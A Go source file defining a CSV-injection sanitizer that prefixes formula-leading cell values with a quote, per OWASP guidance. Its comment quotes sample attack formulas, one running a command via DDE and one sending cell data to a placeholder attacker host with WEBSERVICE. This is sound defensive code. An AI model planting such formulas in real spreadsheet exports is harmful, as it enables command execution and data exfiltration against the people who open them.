package importpkg

// sanitizeCellValue prevents CSV injection attacks by prefixing formula characters with a single quote
// This forces Excel/LibreOffice to treat the value as text instead of a formula
//
// SECURITY: Protects against injection attacks where malicious formulas (=, +, -, @) could:
//   - Execute arbitrary commands (=cmd|'/c calc'!A1)
//   - Exfiltrate data (=WEBSERVICE("hxxp://evil.com/"&A1))
//   - Access local files (=DDE(...))
//
// Reference: OWASP CSV Injection (https://owasp.org/www-community/attacks/CSV_Injection)
func sanitizeCellValue(value string) string {
	if value == "" {
		return value
	}

	// Check if the value starts with a dangerous character
	firstChar := value[0]
	if firstChar == '=' || firstChar == '+' || firstChar == '-' || firstChar == '@' || firstChar == '\t' || firstChar == '\r' {
		// Prefix with a single quote to force text interpretation
		// This is the standard defense recommended by OWASP
		return "'" + value
	}

	return value
}
